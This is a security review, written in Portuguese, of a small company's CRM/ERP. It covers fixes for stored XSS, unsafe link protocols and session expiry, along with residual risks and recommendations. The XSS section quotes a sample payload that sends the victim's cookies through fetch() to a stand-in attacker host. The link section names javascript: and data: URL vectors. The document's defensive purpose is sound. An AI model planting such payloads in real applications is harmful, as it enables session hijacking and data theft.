# Análise de Segurança — Claquete CRM/ERP

Data da análise: setembro/2026
Escopo: código da aplicação, autenticação, banco de dados e publicação.

> Esta análise foi feita sobre a versão **em produção** do sistema, que usa
> banco na nuvem (Turso) e senhas próprias de cada sócio. A versão pública de
> demonstração usa SQLite local, dados fictícios e um login de demonstração;
> as menções a Turso e a backup se referem à produção.

---

## Resumo

Foram encontradas **3 falhas reais**, todas corrigidas nesta versão, e
identificados **6 riscos residuais** que dependem de decisões de vocês, não
de código.

O sistema é adequado ao porte da Claquete: três sócios, dados financeiros
internos, sem informação de terceiros sujeita a regulação pesada. Não está
no nível de um sistema bancário — e não precisa estar.

---

## Falhas encontradas e corrigidas

### 1. XSS armazenado (gravidade: ALTA)

**O que era.** Várias telas montam HTML manualmente para aplicar a identidade
visual da marca. Textos vindos do banco — nome de cliente, título de projeto,
descrição de tarefa — eram inseridos nesse HTML sem tratamento.

**Como alguém exploraria.** Bastava cadastrar um cliente com o nome:

```
<img src=x onerror="fetch('https://site-do-atacante/?c='+document.cookie)">
```

O nome seria salvo normalmente. Mas toda vez que **qualquer sócio** abrisse a
tela de Clientes, o navegador dele executaria aquele código — que poderia
roubar a sessão, alterar a página ou enviar dados para fora.

O detalhe perverso: o ataque fica *armazenado*. Um único cadastro atinge
todos os sócios, repetidamente, até alguém perceber.

**Por que era plausível aqui.** Não exige invasão. Qualquer pessoa com acesso
ao sistema poderia fazer — inclusive por acidente, ao colar um texto de outro
lugar.

**Correção.** Foi criada a função `theme.esc()`, que converte caracteres
perigosos em equivalentes inofensivos, e aplicada aos 39 pontos onde dados do
banco entram em HTML. O texto continua aparecendo exatamente como digitado,
mas nunca mais como código.

---

### 2. Links com protocolo perigoso (gravidade: MÉDIA)

**O que era.** A tela de projetos aceita links do Drive para contratos e
notas fiscais. A validação verificava apenas se o endereço começava com
`http`, e podia ser contornada.

**Como alguém exploraria.** Cadastrando um "documento" com endereço
`javascript:...` ou `data:text/html,...`. O link apareceria normal na tela;
ao ser clicado por outro sócio, executaria código em vez de abrir um arquivo.
Variações com espaços ou tabulação no meio da palavra driblavam a checagem.

**Correção.** A validação agora normaliza o endereço antes de conferir
(removendo tabulações e quebras de linha), aceita somente `http://` e
`https://`, bloqueia parênteses e colchetes — que quebrariam a sintaxe do
link — e limita o tamanho a 2000 caracteres.

---

### 3. Sessão sem expiração (gravidade: MÉDIA)

**O que era.** Uma vez logado, o acesso valia indefinidamente enquanto a aba
estivesse aberta.

**Como alguém exploraria.** Sem invasão nenhuma: bastaria alguém sentar no
computador de um sócio — num coworking, num cliente, num notebook esquecido
aberto — e ter acesso total ao financeiro.

**Correção.** A sessão agora expira após 4 horas sem interação. O valor está
em `MINUTOS_INATIVIDADE`, no arquivo `auth.py`, e pode ser ajustado.

---

## O que foi verificado e está correto

**Injeção de SQL.** Todas as consultas usam parâmetros (`?`) em vez de montar
texto com os valores. As poucas consultas montadas com f-string usam apenas
nomes de tabela vindos de listas fixas do próprio código — nunca de algo
digitado por alguém.

**Guarda de senhas.** As senhas nunca são salvas. O que fica guardado é um
hash PBKDF2-SHA256 com 200 mil iterações e sal aleatório por senha. Mesmo
quem tivesse acesso total ao cofre de segredos não conseguiria descobrir as
senhas. A comparação usa `compare_digest`, que leva sempre o mesmo tempo e
não entrega pistas.

**Proteção das páginas.** Todas as 9 páginas verificam o login **antes** de
qualquer consulta ao banco. Digitar o endereço direto de uma página interna
não contorna o login.

**Segredos fora do código.** Credenciais do banco e senhas ficam em
`.env` / `secrets.toml`, ambos bloqueados no `.gitignore`. O repositório do
GitHub não contém nenhum segredo.

**Transporte.** Tanto o acesso ao sistema quanto a conexão com o banco usam
conexão criptografada.

---

## Riscos residuais (decisão de vocês, não de código)

### 1. Todos os sócios têm poder total
Não há níveis de permissão. Qualquer um pode apagar qualquer coisa, e não há
registro de quem fez o quê. Com três sócios que confiam uns nos outros, é
aceitável. Se entrar um estagiário ou freelancer, deixa de ser.

### 2. Sem histórico de alterações
Se alguém apagar um projeto por engano, não há como saber quem foi nem
desfazer — só restaurando um backup.

### 3. Sem autenticação em dois fatores
Quem souber a senha entra. Vale usar senhas exclusivas deste sistema (não
reaproveitadas de e-mail ou redes sociais) e um gerenciador de senhas.

### 4. Limite de tentativas é fraco
O bloqueio após 5 tentativas vale por sessão do navegador. Alguém insistente
poderia limpar os cookies e recomeçar. Na prática, o que protege de verdade
são os 200 mil ciclos do hash, que tornam tentativas em massa lentas.

### 5. Backup depende de disciplina
O Turso faz backup próprio, mas confiar apenas nele é arriscado. A versão em
produção tem um script que exporta um backup completo antes de zerar o banco;
vale também criar a rotina de exportar periodicamente e guardar fora.

### 6. Senha compartilhada anula tudo
Se os sócios passarem a usar uma senha só, ou trocarem senhas por WhatsApp,
todo o resto perde sentido. Cada um com a sua, compartilhada por gerenciador
de senhas.

---

## Recomendações práticas

**Imediato**
1. Atualizar o sistema com esta versão corrigida.
2. Conferir que cada sócio tem senha própria e exclusiva deste sistema.
3. Exportar um backup e guardar fora da nuvem do Turso.

**Próximos meses**
4. Criar o hábito de backup mensal.
5. Revisar quem tem acesso sempre que a equipe mudar.
6. Se entrar alguém que não é sócio, aí sim vale construir níveis de
   permissão — é o próximo passo natural de segurança.

**Se o sistema crescer**
7. Registro de alterações (quem fez o quê e quando).
8. Autenticação em dois fatores.
9. Bloqueio por tentativas guardado no banco, não só na sessão.

---

## Uma nota honesta sobre o alcance desta análise

Esta é uma revisão do código e da arquitetura. Ela **não** substitui:

- Um teste de invasão de verdade, feito por profissional contra o sistema no ar
- Auditoria da infraestrutura do Streamlit Cloud e do Turso, que estão fora
  do seu controle
- Análise de conformidade com a LGPD, caso vocês passem a guardar dados
  pessoais de clientes além de nome e contato comercial

Para o momento atual da Claquete, o nível de proteção está proporcional ao risco.
Se o sistema passar a guardar dados sensíveis de terceiros, ou se a empresa
crescer a ponto de o financeiro ser alvo interessante, vale contratar uma
revisão independente.
